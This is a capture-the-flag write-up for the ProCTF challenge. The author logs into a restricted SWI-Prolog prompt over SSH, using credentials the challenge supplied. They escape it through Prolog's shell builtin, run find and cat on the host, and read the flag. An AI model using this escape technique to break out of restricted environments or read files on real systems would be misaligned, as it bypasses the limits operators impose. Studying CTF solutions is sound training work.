## ProCTF Writeup

#### Challenge Statement

We Provide you a Login for your scientific researches. Don't try to find the flag.

ssh pro@95.179.148.72
Password: iamthepr0

#### Description

After `ssh`ing into the server, we're met with a standard Ubuntu welcome message. The prompt, however, is somewhat strange, and standard Unix commands don't seem to work...

```sh
?- ls
|    clear
|    cd
|
```

#### Solution

At a bit of a loss, I eventually tried ctrl-C, which led to an interrupt handler with an option to print the stack trace.

```
?- ^C
^C

WARNING: By typing Control-C twice, you have forced an asynchronous
WARNING: interrupt.  Your only SAFE operations are: c(ontinue), p(id),
WARNING: s(stack) and e(xit).  Notably a(abort) often works, but
WARNING: leaves the system in an UNSTABLE state

Action (h for help) ? C-stack trace labeled "INT":
sh: 1: addr2line: not found
  [0] /usr/lib/swipl/lib/x86_64-linux/libswipl.so.8(+0xfc85a) [0x7f3c590df85a]
sh: 1: addr2line: not found
  [1] /usr/lib/swipl/lib/x86_64-linux/libswipl.so.8(+0x9dfec) [0x7f3c59080fec]
...
```

Looks like we're dealing with something called `swipl`. A quick search led me to Prolog, a declarative programming language commonly used for AI research.

I found that a `flag` function was defined, which expected 3 arguments. This was a red herring, however, as it's actually a built-in Prolog function.

Eventually I arrived at the `shell` command, allowing arbitrary code execution on the surrounding shell. Suspecting that there was a flag file, I ran `find / -name "*flag*".`

```sh
?- shell('find / -name "*flag*"').
find: ‘/root’: Permission denied
/home/user/flag.txt
find: ‘/var/cache/ldconfig’: Permission denied
...
```

Looks like I was right. All that was left was to print it out:

```sh
?- shell('cat /home/user/flag.txt').
cybrics{feeling_like_a_PRO?_that_sounds_LOGical_to_me!____g3t_it?_G37_1T?!?!_ok_N3v3Rm1nd...}
true.
```

#### Flag

`cybrics{feeling_like_a_PRO?_that_sounds_LOGical_to_me!____g3t_it?_G37_1T?!?!_ok_N3v3Rm1nd...}`